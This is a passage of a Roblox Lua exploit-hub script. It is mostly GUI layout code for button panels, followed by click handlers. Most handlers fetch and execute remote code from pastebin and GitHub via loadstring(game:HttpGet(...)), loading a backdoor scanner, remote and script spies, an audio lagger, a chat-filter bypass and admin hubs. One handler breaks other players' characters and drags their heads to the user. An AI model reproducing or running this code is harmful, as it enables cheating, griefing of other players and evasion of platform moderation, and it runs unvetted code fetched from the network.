		Uzi.TextColor3 = Color3.fromRGB(255, 255, 255)
		Uzi.TextSize = 14.000
		Uzi.TextWrapped = true
	
		AK47.Name = "AK47"
		AK47.Parent = GearTools
		AK47.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		AK47.BorderColor3 = Color3.fromRGB(255, 0, 0)
		AK47.BorderSizePixel = 3
		AK47.Position = UDim2.new(0, 0, 0, 132)
		AK47.Size = UDim2.new(0.5, 0, 0, 30)
		AK47.ZIndex = 2
		AK47.Font = Enum.Font.SourceSans
		AK47.Text = "Empty"
		AK47.TextColor3 = Color3.fromRGB(255, 255, 255)
		AK47.TextSize = 14.000
	
		M3GreaseGun.Name = "M3 Grease Gun"
		M3GreaseGun.Parent = GearTools
		M3GreaseGun.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		M3GreaseGun.BorderColor3 = Color3.fromRGB(255, 0, 0)
		M3GreaseGun.BorderSizePixel = 3
		M3GreaseGun.Position = UDim2.new(0.5, 3, 0, 132)
		M3GreaseGun.Size = UDim2.new(0.5, -3, 0, 30)
		M3GreaseGun.ZIndex = 2
		M3GreaseGun.Font = Enum.Font.SourceSans
		M3GreaseGun.Text = "Empty"
		M3GreaseGun.TextColor3 = Color3.fromRGB(255, 255, 255)
		M3GreaseGun.TextSize = 14.000
		M3GreaseGun.TextWrapped = true
	
		Empty.Name = "Empty"
		Empty.Parent = GearTools
		Empty.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Empty.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Empty.BorderSizePixel = 3
		Empty.Position = UDim2.new(0, 0, 0, 165)
		Empty.Size = UDim2.new(0.499000013, 0, 0, 30)
		Empty.ZIndex = 2
		Empty.Font = Enum.Font.SourceSans
		Empty.Text = "Empty"
		Empty.TextColor3 = Color3.fromRGB(255, 255, 255)
		Empty.TextSize = 14.000
	
		Empty_2.Name = "Empty"
		Empty_2.Parent = GearTools
		Empty_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Empty_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Empty_2.BorderSizePixel = 3
		Empty_2.Position = UDim2.new(0.5, 3, 0, 165)
		Empty_2.Size = UDim2.new(0.5, -3, 0, 30)
		Empty_2.ZIndex = 2
		Empty_2.Font = Enum.Font.SourceSans
		Empty_2.Text = "Empty"
		Empty_2.TextColor3 = Color3.fromRGB(255, 255, 255)
		Empty_2.TextSize = 14.000
	
		Empty_3.Name = "Empty"
		Empty_3.Parent = GearTools
		Empty_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Empty_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Empty_3.BorderSizePixel = 3
		Empty_3.Position = UDim2.new(0, 0, 0, 198)
		Empty_3.Size = UDim2.new(0.499000013, 0, 0, 30)
		Empty_3.ZIndex = 3
		Empty_3.Font = Enum.Font.SourceSans
		Empty_3.Text = "Empty"
		Empty_3.TextColor3 = Color3.fromRGB(255, 255, 255)
		Empty_3.TextSize = 14.000
		Empty_3.TextWrapped = true
	
		Empty_4.Name = "Empty"
		Empty_4.Parent = GearTools
		Empty_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Empty_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Empty_4.BorderSizePixel = 3
		Empty_4.Position = UDim2.new(0.5, 3, 0, 198)
		Empty_4.Size = UDim2.new(0.5, -3, 0, 30)
		Empty_4.ZIndex = 2
		Empty_4.Font = Enum.Font.SourceSans
		Empty_4.Text = "Empty"
		Empty_4.TextColor3 = Color3.fromRGB(255, 255, 255)
		Empty_4.TextSize = 14.000
	
		Title_16.Name = "Title"
		Title_16.Parent = GearTools
		Title_16.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_16.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_16.BorderSizePixel = 3
		Title_16.Size = UDim2.new(1, 0, 0, 30)
		Title_16.ZIndex = 2
		Title_16.Font = Enum.Font.SourceSansBold
		Title_16.Text = "Gear/Tools"
		Title_16.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_16.TextSize = 14.000
	
		Empty_5.Name = "Empty"
		Empty_5.Parent = GearTools
		Empty_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Empty_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Empty_5.BorderSizePixel = 3
		Empty_5.Position = UDim2.new(0.5, 3, 0.10204082, 198)
		Empty_5.Size = UDim2.new(0.5, -3, 0, 30)
		Empty_5.ZIndex = 2
		Empty_5.Font = Enum.Font.SourceSans
		Empty_5.Text = "Empty"
		Empty_5.TextColor3 = Color3.fromRGB(255, 255, 255)
		Empty_5.TextSize = 14.000
	
		Empty_6.Name = "Empty"
		Empty_6.Parent = GearTools
		Empty_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Empty_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Empty_6.BorderSizePixel = 3
		Empty_6.Position = UDim2.new(0, 0, 0, 228)
		Empty_6.Size = UDim2.new(0.499000013, 0, 0, 30)
		Empty_6.ZIndex = 3
		Empty_6.Font = Enum.Font.SourceSans
		Empty_6.Text = "Empty"
		Empty_6.TextColor3 = Color3.fromRGB(255, 255, 255)
		Empty_6.TextSize = 14.000
		Empty_6.TextWrapped = true
	
		WeaponScripts.Name = "Weapon Scripts"
		WeaponScripts.Parent = Page2_2
		WeaponScripts.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		WeaponScripts.BorderColor3 = Color3.fromRGB(255, 0, 0)
		WeaponScripts.BorderSizePixel = 3
		WeaponScripts.Size = UDim2.new(0.5, -3, 1, 0)
		WeaponScripts.ZIndex = 2
	
		Goner.Name = "Goner"
		Goner.Parent = WeaponScripts
		Goner.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Goner.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Goner.BorderSizePixel = 3
		Goner.Position = UDim2.new(0, 0, 0, 33)
		Goner.Size = UDim2.new(0.5, 0, 0, 30)
		Goner.ZIndex = 2
		Goner.Font = Enum.Font.SourceSans
		Goner.Text = "Goner"
		Goner.TextColor3 = Color3.fromRGB(255, 255, 255)
		Goner.TextSize = 14.000
	
		TrueSSHub.Name = "True SS Hub"
		TrueSSHub.Parent = WeaponScripts
		TrueSSHub.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		TrueSSHub.BorderColor3 = Color3.fromRGB(255, 0, 0)
		TrueSSHub.BorderSizePixel = 3
		TrueSSHub.Position = UDim2.new(0.5, 3, 0, 33)
		TrueSSHub.Size = UDim2.new(0.5, -3, 0, 30)
		TrueSSHub.ZIndex = 2
		TrueSSHub.Font = Enum.Font.SourceSans
		TrueSSHub.Text = "True SS Hub"
		TrueSSHub.TextColor3 = Color3.fromRGB(255, 255, 255)
		TrueSSHub.TextSize = 14.000
		TrueSSHub.TextWrapped = true
	
		GoodCopBadCop.Name = "Good Cop Bad Cop"
		GoodCopBadCop.Parent = WeaponScripts
		GoodCopBadCop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		GoodCopBadCop.BorderColor3 = Color3.fromRGB(255, 0, 0)
		GoodCopBadCop.BorderSizePixel = 3
		GoodCopBadCop.Position = UDim2.new(0, 0, 0, 66)
		GoodCopBadCop.Size = UDim2.new(0.5, 0, 0, 30)
		GoodCopBadCop.ZIndex = 2
		GoodCopBadCop.Font = Enum.Font.SourceSans
		GoodCopBadCop.Text = "Good/Bad Cop"
		GoodCopBadCop.TextColor3 = Color3.fromRGB(255, 255, 255)
		GoodCopBadCop.TextSize = 14.000
		GoodCopBadCop.TextWrapped = true
	
		FallenAnger.Name = "Fallen Anger"
		FallenAnger.Parent = WeaponScripts
		FallenAnger.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		FallenAnger.BorderColor3 = Color3.fromRGB(255, 0, 0)
		FallenAnger.BorderSizePixel = 3
		FallenAnger.Position = UDim2.new(0.5, 3, 0, 66)
		FallenAnger.Size = UDim2.new(0.5, -3, 0, 30)
		FallenAnger.ZIndex = 2
		FallenAnger.Font = Enum.Font.SourceSans
		FallenAnger.Text = "Fallen Anger"
		FallenAnger.TextColor3 = Color3.fromRGB(255, 255, 255)
		FallenAnger.TextSize = 14.000
		FallenAnger.TextWrapped = true
	
		NullwareHub.Name = "Nullware Hub"
		NullwareHub.Parent = WeaponScripts
		NullwareHub.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		NullwareHub.BorderColor3 = Color3.fromRGB(255, 0, 0)
		NullwareHub.BorderSizePixel = 3
		NullwareHub.Position = UDim2.new(0, 0, 0, 99)
		NullwareHub.Size = UDim2.new(0.499000013, 0, 0, 30)
		NullwareHub.ZIndex = 2
		NullwareHub.Font = Enum.Font.SourceSans
		NullwareHub.Text = "Nullware Hub"
		NullwareHub.TextColor3 = Color3.fromRGB(255, 255, 255)
		NullwareHub.TextSize = 14.000
		NullwareHub.TextWrapped = true
	
		PunchScript.Name = "Punch Script"
		PunchScript.Parent = WeaponScripts
		PunchScript.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		PunchScript.BorderColor3 = Color3.fromRGB(255, 0, 0)
		PunchScript.BorderSizePixel = 3
		PunchScript.Position = UDim2.new(0.5, 3, 0, 99)
		PunchScript.Size = UDim2.new(0.5, -3, 0, 30)
		PunchScript.ZIndex = 2
		PunchScript.Font = Enum.Font.SourceSans
		PunchScript.Text = "Punch Script"
		PunchScript.TextColor3 = Color3.fromRGB(255, 255, 255)
		PunchScript.TextSize = 14.000
	
		_500PoundsBall.Name = "500 Pounds Ball"
		_500PoundsBall.Parent = WeaponScripts
		_500PoundsBall.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		_500PoundsBall.BorderColor3 = Color3.fromRGB(255, 0, 0)
		_500PoundsBall.BorderSizePixel = 3
		_500PoundsBall.Position = UDim2.new(0, 0, 0, 132)
		_500PoundsBall.Size = UDim2.new(0.499000013, 0, 0, 30)
		_500PoundsBall.ZIndex = 2
		_500PoundsBall.Font = Enum.Font.SourceSans
		_500PoundsBall.Text = "500 Pounds Ball"
		_500PoundsBall.TextColor3 = Color3.fromRGB(255, 255, 255)
		_500PoundsBall.TextSize = 14.000
		_500PoundsBall.TextWrapped = true
	
		GermanSoldier.Name = "German Soldier"
		GermanSoldier.Parent = WeaponScripts
		GermanSoldier.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		GermanSoldier.BorderColor3 = Color3.fromRGB(255, 0, 0)
		GermanSoldier.BorderSizePixel = 3
		GermanSoldier.Position = UDim2.new(0.5, 3, 0, 132)
		GermanSoldier.Size = UDim2.new(0.5, -3, 0, 30)
		GermanSoldier.ZIndex = 2
		GermanSoldier.Font = Enum.Font.SourceSans
		GermanSoldier.Text = "German Sol"
		GermanSoldier.TextColor3 = Color3.fromRGB(255, 255, 255)
		GermanSoldier.TextSize = 14.000
		GermanSoldier.TextWrapped = true
	
		Minigun.Name = "Minigun"
		Minigun.Parent = WeaponScripts
		Minigun.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Minigun.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Minigun.BorderSizePixel = 3
		Minigun.Position = UDim2.new(0, 0, 0, 165)
		Minigun.Size = UDim2.new(0.5, 0, 0, 30)
		Minigun.ZIndex = 2
		Minigun.Font = Enum.Font.SourceSans
		Minigun.Text = "Minigun"
		Minigun.TextColor3 = Color3.fromRGB(255, 255, 255)
		Minigun.TextSize = 14.000
	
		GKV3.Name = "GKV3"
		GKV3.Parent = WeaponScripts
		GKV3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		GKV3.BorderColor3 = Color3.fromRGB(255, 0, 0)
		GKV3.BorderSizePixel = 3
		GKV3.Position = UDim2.new(0.5, 3, 0, 165)
		GKV3.Size = UDim2.new(0.5, -3, 0, 30)
		GKV3.ZIndex = 2
		GKV3.Font = Enum.Font.SourceSans
		GKV3.Text = "Empty"
		GKV3.TextColor3 = Color3.fromRGB(255, 255, 255)
		GKV3.TextSize = 14.000
	
		GrabKnifeV4.Name = "Grab Knife V4"
		GrabKnifeV4.Parent = WeaponScripts
		GrabKnifeV4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		GrabKnifeV4.BorderColor3 = Color3.fromRGB(255, 0, 0)
		GrabKnifeV4.BorderSizePixel = 3
		GrabKnifeV4.Position = UDim2.new(0, 0, 0, 198)
		GrabKnifeV4.Size = UDim2.new(0.5, 0, 0, 30)
		GrabKnifeV4.ZIndex = 2
		GrabKnifeV4.Font = Enum.Font.SourceSans
		GrabKnifeV4.Text = "Empty"
		GrabKnifeV4.TextColor3 = Color3.fromRGB(255, 255, 255)
		GrabKnifeV4.TextSize = 14.000
		GrabKnifeV4.TextWrapped = true
	
		Empty_7.Name = "Empty"
		Empty_7.Parent = WeaponScripts
		Empty_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Empty_7.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Empty_7.BorderSizePixel = 3
		Empty_7.Position = UDim2.new(0.5, 3, 0, 198)
		Empty_7.Size = UDim2.new(0.479999989, 0, 0, 30)
		Empty_7.ZIndex = 2
		Empty_7.Font = Enum.Font.SourceSans
		Empty_7.Text = "Empty"
		Empty_7.TextColor3 = Color3.fromRGB(255, 255, 255)
		Empty_7.TextSize = 14.000
		Empty_7.TextWrapped = true
	
		Empty_8.Name = "Empty"
		Empty_8.Parent = WeaponScripts
		Empty_8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Empty_8.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Empty_8.BorderSizePixel = 3
		Empty_8.Position = UDim2.new(0, 0, 0, 228)
		Empty_8.Size = UDim2.new(0.5, 0, 0, 30)
		Empty_8.ZIndex = 2
		Empty_8.Font = Enum.Font.SourceSans
		Empty_8.Text = "Empty"
		Empty_8.TextColor3 = Color3.fromRGB(255, 255, 255)
		Empty_8.TextSize = 14.000
		Empty_8.TextWrapped = true
	
		Empty_9.Name = "Empty"
		Empty_9.Parent = WeaponScripts
		Empty_9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Empty_9.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Empty_9.BorderSizePixel = 3
		Empty_9.Position = UDim2.new(0.5, 3, -0.0102040814, 231)
		Empty_9.Size = UDim2.new(0.5, -3, 0, 30)
		Empty_9.ZIndex = 2
		Empty_9.Font = Enum.Font.SourceSans
		Empty_9.Text = "Empty"
		Empty_9.TextColor3 = Color3.fromRGB(255, 255, 255)
		Empty_9.TextSize = 14.000
		Empty_9.TextWrapped = true
	
		Title_17.Name = "Title"
		Title_17.Parent = WeaponScripts
		Title_17.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_17.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_17.BorderSizePixel = 3
		Title_17.Size = UDim2.new(1, 0, 0, 30)
		Title_17.ZIndex = 2
		Title_17.Font = Enum.Font.SourceSansBold
		Title_17.Text = "Weapon Scripts/Hubs"
		Title_17.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_17.TextSize = 14.000
	
		Title_18.Name = "Title"
		Title_18.Parent = Page2_2
		Title_18.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_18.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_18.BorderSizePixel = 3
		Title_18.Position = UDim2.new(-0.0011353048, 0, 0.897656918, 0)
		Title_18.Size = UDim2.new(1.00113535, 0, 0, 30)
		Title_18.ZIndex = 2
		Title_18.Font = Enum.Font.SourceSansBold
		Title_18.Text = "Page 2"
		Title_18.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_18.TextSize = 14.000
	
		cool.Name = "cool"
		cool.Parent = Frame
		cool.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		cool.BackgroundTransparency = 1.000
		cool.Position = UDim2.new(1.00999999, 0, 0, 0)
		cool.Size = UDim2.new(0, 45, 0, 400)
		cool.Visible = false
	
		idk_2.Name = "idk"
		idk_2.Parent = cool
		idk_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		idk_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
		idk_2.BorderSizePixel = 3
		idk_2.Position = UDim2.new(-0.078332521, 3, -0.949999988, 380)
		idk_2.Size = UDim2.new(0, 26, 0, 400)
		idk_2.ZIndex = 3
		idk_2.Font = Enum.Font.SourceSans
		idk_2.Text = ">"
		idk_2.TextColor3 = Color3.fromRGB(65025, 65025, 65025)
		idk_2.TextSize = 50.000
	
		Page3_2.Name = "Page3"
		Page3_2.Parent = Frame
		Page3_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Page3_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Page3_2.BorderSizePixel = 3
		Page3_2.Position = UDim2.new(0, 0, 0, 83)
		Page3_2.Size = UDim2.new(1, 0, 1, -106)
		Page3_2.Visible = false
		Page3_2.ZIndex = 2
	
		Title_19.Name = "Title"
		Title_19.Parent = Page3_2
		Title_19.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title_19.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title_19.BorderSizePixel = 3
		Title_19.Position = UDim2.new(-0.0011353048, 0, 0.897656918, 0)
		Title_19.Size = UDim2.new(1.00113535, 0, 0, 30)
		Title_19.ZIndex = 2
		Title_19.Font = Enum.Font.SourceSansBold
		Title_19.Text = "Page 3"
		Title_19.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title_19.TextSize = 14.000
	
		Clear.Name = "Clear"
		Clear.Parent = Page3_2
		Clear.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Clear.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Clear.BorderSizePixel = 3
		Clear.Position = UDim2.new(0.5, 3, 0.5, 66)
		Clear.Size = UDim2.new(0.453333288, -3, 0, 30)
		Clear.ZIndex = 2
		Clear.Font = Enum.Font.SourceSans
		Clear.Text = "Clear"
		Clear.TextColor3 = Color3.fromRGB(255, 255, 255)
		Clear.TextSize = 14.000
	
		Execute.Name = "Execute"
		Execute.Parent = Page3_2
		Execute.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Execute.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Execute.BorderSizePixel = 3
		Execute.Position = UDim2.new(0, 12, 0, 213)
		Execute.Size = UDim2.new(0.449999988, 0, 0, 30)
		Execute.ZIndex = 2
		Execute.Font = Enum.Font.SourceSans
		Execute.Text = "Execute"
		Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
		Execute.TextSize = 14.000
	
		Input.Name = "Input"
		Input.Parent = Page3_2
		Input.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Input.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Input.BorderSizePixel = 3
		Input.Position = UDim2.new(0.0399999991, 0, 0.0544217676, 0)
		Input.Size = UDim2.new(0.909999907, 1, 0.622448981, -1)
		Input.ZIndex = 2
		Input.Font = Enum.Font.SourceSans
		Input.Text = ""
		Input.TextColor3 = Color3.fromRGB(255, 255, 255)
		Input.TextSize = 14.000
		Input.TextXAlignment = Enum.TextXAlignment.Left
		Input.TextYAlignment = Enum.TextYAlignment.Top
	
		CloseOpen.Name = "Close/Open"
		CloseOpen.Parent = culgui
		CloseOpen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		CloseOpen.BorderColor3 = Color3.fromRGB(255, 0, 0)
		CloseOpen.BorderSizePixel = 3
		CloseOpen.Position = UDim2.new(0, 3, 0.300000012, 380)
		CloseOpen.Size = UDim2.new(0, 300, 0, 20)
		CloseOpen.ZIndex = 3
		CloseOpen.Font = Enum.Font.SourceSans
		CloseOpen.Text = "Close/Open"
		CloseOpen.TextColor3 = Color3.fromRGB(65025, 65025, 65025)
		CloseOpen.TextSize = 18.000
	
		-- Scripts:
	
		local function JYQB_fake_script() -- Backdoorexe.LocalScript 
			local script = Instance.new('LocalScript', Backdoorexe)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();
			end)
		end
		coroutine.wrap(JYQB_fake_script)()
		local function YPYS_fake_script() -- ScriptSpy.LocalScript 
			local script = Instance.new('LocalScript', ScriptSpy)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet('https://pastebin.com/raw/yBLDEdDn'))()
			end)
		end
		coroutine.wrap(YPYS_fake_script)()
		local function GXBP_fake_script() -- T0PK3K.LocalScript 
			local script = Instance.new('LocalScript', T0PK3K)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet('https://pastebin.com/raw/h1TN1kij'))()
			end)
		end
		coroutine.wrap(GXBP_fake_script)()
		local function LIYPYW_fake_script() -- audiolagger.LocalScript 
			local script = Instance.new('LocalScript', audiolagger)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet('https://pastebin.com/raw/4z9GWRY6'))()
			end)
		end
		coroutine.wrap(LIYPYW_fake_script)()
		local function KIEUCEM_fake_script() -- RemoteSpy.LocalScript 
			local script = Instance.new('LocalScript', RemoteSpy)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet('https://pastebin.com/raw/j4qyW7Ku'))()
			end)
		end
		coroutine.wrap(KIEUCEM_fake_script)()
		local function KMJZM_fake_script() -- InfiniteYield.LocalScript 
			local script = Instance.new('LocalScript', InfiniteYield)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
			end)
		end
		coroutine.wrap(KMJZM_fake_script)()
		local function SNVO_fake_script() -- FatesAdmin.LocalScript 
			local script = Instance.new('LocalScript', FatesAdmin)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
			end)
		end
		coroutine.wrap(SNVO_fake_script)()
		local function XOJJBR_fake_script() -- UnanchoredGui.LocalScript 
			local script = Instance.new('LocalScript', UnanchoredGui)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastebin.com/raw/WkZwcGjf", true))()
			end)
		end
		coroutine.wrap(XOJJBR_fake_script)()
		local function AOUEQSA_fake_script() -- ChatHaxx.LocalScript 
			local script = Instance.new('LocalScript', ChatHaxx)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet('https://raw.githubusercontent.com/ant-7802/--/main/straightmilk.lua'))()
			end)
		end
		coroutine.wrap(AOUEQSA_fake_script)()
		local function BUFJNW_fake_script() -- PendulumHub.LocalScript 
			local script = Instance.new('LocalScript', PendulumHub)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua"))()
			end)
		end
		coroutine.wrap(BUFJNW_fake_script)()
		local function ZQPU_fake_script() -- Hydroxide.LocalScript 
			local script = Instance.new('LocalScript', Hydroxide)
	
			script.Parent.MouseButton1Click:Connect(function()
				local owner = "Upbolt"
				local branch = "revision"
	
				local function webImport(file)
					return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
				end
	
				webImport("init")
			end)
		end
		coroutine.wrap(ZQPU_fake_script)()
		local function QSNRHN_fake_script() -- Opfinality.LocalScript 
			local script = Instance.new('LocalScript', Opfinality)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet('https://pastebin.com/raw/cdWKjwj8'))()
			end)
		end
		coroutine.wrap(QSNRHN_fake_script)()
		local function AOZQKYX_fake_script() -- Homebrewadmin.LocalScript 
			local script = Instance.new('LocalScript', Homebrewadmin)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Syntaxx64/HomebrewAdmin/master/Main"))()
			end)
		end
		coroutine.wrap(AOZQKYX_fake_script)()
		local function WTQZKI_fake_script() -- CMDX.LocalScript 
			local script = Instance.new('LocalScript', CMDX)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
			end)
		end
		coroutine.wrap(WTQZKI_fake_script)()
		local function FNLW_fake_script() -- Bringallplayersheads.LocalScript 
			local script = Instance.new('LocalScript', Bringallplayersheads)
	
			script.Parent.MouseButton1Click:Connect(function()
				while true do
					local LP = game:GetService("Players").LocalPlayer
					for i,v in pairs(game:GetService("Players"):GetPlayers()) do
						if v and v.Character and v ~= LP and v.Character:FindFirstChild("Head") then
							local hrp = v.Character:FindFirstChild("Head") --// I thought of using humanoidrootpart first but it works better with the head!
							hrp:BreakJoints()
							hrp.Transparency = 0
							hrp.BrickColor = v.TeamColor
							hrp.Anchored = true
							hrp.CanCollide = false
							pcall(function()
								hrp.CFrame = LP.Character.HumanoidRootPart.CFrame * CFrame.new(1,0,-3.5)
							end)
						end
					end
					wait(1)
				end
			end)
		end
		coroutine.wrap(FNLW_fake_script)()
		local function DLVXFNK_fake_script() -- singc00lkiddtheme.LocalScript 
			local script = Instance.new('LocalScript', singc00lkiddtheme)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastebin.com/raw/eMzcLtLp"))();
			end)
		end
		coroutine.wrap(DLVXFNK_fake_script)()
		local function QXYHLIS_fake_script() -- Platform.LocalScript 
			local script = Instance.new('LocalScript', Platform)
	
			script.Parent.MouseButton1Click:Connect(function()
				local name = game.Players.LocalPlayer.Name
	
				local p = Instance.new("Part")
				p.Parent = workspace
				p.Locked = true
				p.BrickColor = BrickColor.new("White")
				p.BrickColor = BrickColor.new(104)
				p.Size = Vector3.new(30.697, 1, 33.698)
				p.Anchored = true
				local m = Instance.new("CylinderMesh")
				m.Scale = Vector3.new(1, 0.5, 1)
				m.Parent = p
				p.CFrame = CFrame.new(game.Players:findFirstChild(name).Character.Torso.CFrame.x, game.Players:findFirstChild(name).Character.Torso.CFrame.y - 4, game.Players:findFirstChild(name).Character.Torso.CFrame.z)
			end)
		end
		coroutine.wrap(QXYHLIS_fake_script)()
		local function UVZB_fake_script() -- HeadFling.LocalScript 
			local script = Instance.new('LocalScript', HeadFling)
	
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastebin.com/raw/BK4Q0DfU"))()
			end)
		end
		coroutine.wrap(UVZB_fake_script)()
		local function KLLI_fake_script() -- ChatBypass.LocalScript 
			local script = Instance.new('LocalScript', ChatBypass)
	
			script.Parent.MouseButton1Click:Connect(function()
			--[[
		
		
		 âââ   ââ âââ      âââââââ  ââââââ   âââ  âââââââââââââââ  ââââââ       ââââ âââ   âââ ââââââ  
		ââââ   ââââââââ    ââââ ââââââ â ââââââââââ   â â  âââ âââââ    â      ââââââââââ  âââââââ  âââ
		 âââ  ââââââ  âââ  âââ   âââââ âââ ââââââââââ â â ââââ âââ ââââ        ââââ ââââââ âââââââ ââââ
		  âââ ââââââââââââ ââââ   ââââââââ  ââââââââ  â â ââââ â   â   âââ     ââââââ  â ââââââââââââ â
		   ââââ   ââ   âââââââââââ ââââ ââââââââââââ      ââââ â âââââââââ âââ âââ  ââââ âââââââââ â  â
		   â ââ   ââ   ââââ âââ  â â ââ ââââââ   â â      â ââ   â âââ â â âââ ââââââââ âââââ ââââ â  â
		   â ââ    â   ââ â â â  â   ââ â ââ â â â          â    â ââ  â â ââ  âââ   ââââ âââ ââ â     
		     ââ    â   â    â â  â   ââ   â  â â â â      â      â  â  â   â    â    ââ â ââ  ââ       
		      â        â  â   â       â      â                         â    â   â     â â              
		     â              â                                               â        ââ â                                  
		
		                                       dsc.gg/vadrifts
		                                   vadrifts <3 synergy frfr
		--]]
	
				loadstring(game:HttpGet(('https://raw.githubusercontent.com/vqmpjay/scripts/main/vadriftsbyp'),true))()
			end)
		end
		coroutine.wrap(KLLI_fake_script)()
		local function MGTJGI_fake_script() -- FloatingPad.LocalScript 
			local script = Instance.new('LocalScript', FloatingPad)
	
			script.Parent.MouseButton1Click:Connect(function()
				local name = game.Players.LocalPlayer.Name
	
				local p = Instance.new("Part")
				p.Parent = workspace
				p.Locked = true
				p.BrickColor = BrickColor.new("White")
				p.BrickColor = BrickColor.new(104)
				p.Size = Vector3.new(8, 1.2, 8)
				p.Anchored = true
				local m = Instance.new("CylinderMesh")
				m.Scale = Vector3.new(1, 0.5, 1)
				m.Parent = p
				while true do
					p.CFrame = CFrame.new(game.Players:findFirstChild(name).Character.Torso.CFrame.x, game.Players:findFirstChild(name).Character.Torso.CFrame.y - 4, game.Players:findFirstChild(name).Character.Torso.CFrame.z)
					wait()
				end
			end)
		end
		coroutine.wrap(MGTJGI_fake_script)()
		local function FSUX_fake_script() -- HeadShake.LocalScript 
			local script = Instance.new('LocalScript', HeadShake)
	
			script.Parent.MouseButton1Click:Connect(function()
				for X = 1, math.huge, 0.2 do 
					wait() 
					game.Workspace[game.Players.LocalPlayer.Name].Torso.Neck.C0 = CFrame.new(math.sin(X) / 1,1.5,0) 
					game.Workspace[game.Players.LocalPlayer.Name].Torso.Neck.C1 = CFrame.new(0,0,0) 
				end 
				for X = 1, math.huge, 0.1 do 
					wait() 
					game.Workspace[game.Players.LocalPlayer.Name].Torso.Neck.C0 = CFrame.new(0,1.5,0) * CFrame.fromAxisAngle(Vector3.new(0,1,0), X) 
					game.Workspace[game.Players.LocalPlayer.Name].Torso.Neck.C1 = CFrame.new(0,0,0) 
				end 
				for _,c in pairs(game.Players:GetChildren()) do
